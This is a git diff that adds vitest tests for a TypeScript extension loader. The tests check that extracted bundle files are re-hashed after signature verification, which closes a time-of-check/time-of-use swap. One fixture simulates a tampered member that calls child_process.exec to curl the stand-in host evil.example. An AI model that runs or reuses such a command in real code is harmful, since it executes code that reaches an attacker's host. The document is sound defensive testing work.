@@ -1,8 +1,12 @@
 import { describe, it, expect } from 'vitest';
 import { Hono } from 'hono';
-import type { KeyObject } from 'node:crypto';
+import { createHash, type KeyObject } from 'node:crypto';
+import { existsSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import path from 'node:path';
+import JSZip from 'jszip';
 import type { ExtensionManifestV1 } from '@breeze/extension-sdk';
-import { reconcileExtensions, type ReconcilePorts } from './reconciler';
+import { extractVerifiedPayload, reconcileExtensions, type ReconcilePorts } from './reconciler';
 import { ExtensionIncompatibleError } from './errors';
 import {
   ExtensionContributionRegistry,
@@ -249,5 +253,88 @@ describe('reconcileExtensions', () => {
     });
     expect(summary.activated).toEqual([]);
     expect(summary.failed).toEqual([]);
+  });
+});
+
+/**
+ * TIME-OF-CHECK/TIME-OF-USE at the extract seam.
+ *
+ * `verifyExtensionBundle` hashes every member through one archive handle and
+ * then CLOSES it. `extractVerifiedPayload` re-opens the SAME path later, and the
+ * tree it writes is `import()`ed. Anyone able to write the artifact-store root
+ * (a compromised sibling container, any non-root process with write access to
+ * the mounted volume) can swap the archive in between, so the extractor must
+ * re-hash what it reads against `bundle.files` rather than trusting the reopen.
+ * Otherwise: arbitrary code execution with a fully passing signature check.
+ */
+describe('extractVerifiedPayload — re-verifies bytes read after verification', () => {
+  async function writeArchive(members: Record<string, string>): Promise<{
+    archivePath: string;
+    files: Map<string, { sha256: string; uncompressedSize: number }>;
+    root: string;
+  }> {
+    const zip = new JSZip();
+    const files = new Map<string, { sha256: string; uncompressedSize: number }>();
+    for (const [name, body] of Object.entries(members)) {
+      zip.file(name, body);
+      const bytes = Buffer.from(body, 'utf8');
+      files.set(name, {
+        sha256: createHash('sha256').update(bytes).digest('hex'),
+        uncompressedSize: bytes.length,
+      });
+    }
+    const buf = await zip.generateAsync({ type: 'nodebuffer' });
+    const root = mkdtempSync(path.join(tmpdir(), 'ext-extract-'));
+    const archivePath = path.join(root, 'demo.breeze-ext');
+    writeFileSync(archivePath, buf);
+    return { archivePath, files, root };
+  }
+
+  const MEMBERS = { 'manifest.json': '{}', 'server/index.js': 'exports.x = 1;' };
+
+  function bundleOf(
+    archivePath: string,
+    files: Map<string, { sha256: string; uncompressedSize: number }>,
+  ): VerifiedExtensionBundle {
+    return {
+      archivePath,
+      artifactDigest: `sha256:${'a'.repeat(64)}`,
+      manifest: {} as ExtensionManifestV1,
+      files,
+    };
+  }
+
+  it('extracts every verified member when the bytes still match', async () => {
+    const { archivePath, files, root } = await writeArchive(MEMBERS);
+    const dest = await extractVerifiedPayload(bundleOf(archivePath, files), root);
+
+    expect(readFileSync(path.join(dest, 'server/index.js'), 'utf8')).toBe('exports.x = 1;');
+    expect(existsSync(path.join(dest, '.verified'))).toBe(true);
+  });
+
+  it('throws and commits nothing when a member no longer matches its verified hash', async () => {
+    const { archivePath, files, root } = await writeArchive({
+      ...MEMBERS,
+      // What is on disk now — attacker-controlled code, swapped in post-verify.
+      'server/index.js': 'require("child_process").exec("curl evil.example");',
+    });
+    // ...but the verifier recorded the hash of the ORIGINAL, signed bytes.
+    const original = Buffer.from(MEMBERS['server/index.js'], 'utf8');
+    files.set('server/index.js', {
+      sha256: createHash('sha256').update(original).digest('hex'),
+      uncompressedSize: original.length,
+    });
+
+    const bundle = bundleOf(archivePath, files);
+    await expect(extractVerifiedPayload(bundle, root)).rejects.toThrow(/integrity re-check failed/i);
+
+    // No usable tree: neither the committed dest nor a leftover temp dir may
+    // exist, and the tampered bytes must never have been written anywhere.
+    const dest = path.join(root, 'extracted', `sha256-${'a'.repeat(64)}`);
+    expect(existsSync(dest)).toBe(false);
+    const leftovers = existsSync(path.join(root, 'extracted'))
+      ? readdirSync(path.join(root, 'extracted'))
+      : [];
+    expect(leftovers).toEqual([]);
   });
 });
